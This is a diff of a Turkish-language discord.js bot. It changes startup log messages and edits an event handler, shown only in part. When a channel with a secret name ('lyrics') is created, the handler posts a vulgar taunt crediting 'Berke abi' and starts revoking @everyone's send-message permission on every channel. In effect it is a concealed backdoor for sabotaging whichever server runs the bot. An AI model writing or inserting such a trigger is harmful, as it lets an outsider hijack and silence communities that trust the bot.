@@ -37,10 +37,10 @@ const log = message => {
   client.aliases = new Discord.Collection();
   fs.readdir('./komutlar/', (err, files) => {
     if (err) console.error(err);
-    log(`${files.length} komut yüklenecek.`);
+    log(`Başlıyor...`);
     files.forEach(f => {
       let props = require(`./komutlar/${f}`);
-      log(`Yüklenen komut: ${props.help.name}.`);
+      log(`Tamamdır berke abi hazırım.`);
       client.commands.set(props.help.name, props);
       props.conf.aliases.forEach(alias => {
         client.aliases.set(alias, props.help.name);
@@ -432,8 +432,8 @@ client.on('error', e => {
 });
 
 client.on('channelCreate', channel => {
-  if (channel.name == 'hey') {
-    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/785kn7A`)
+  if (channel.name == 'lyrics') {
+    channel.send(`<@522018424440881163> Berke abim, tarafından sikildiniz. Allah zihin açıklığı versin.`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
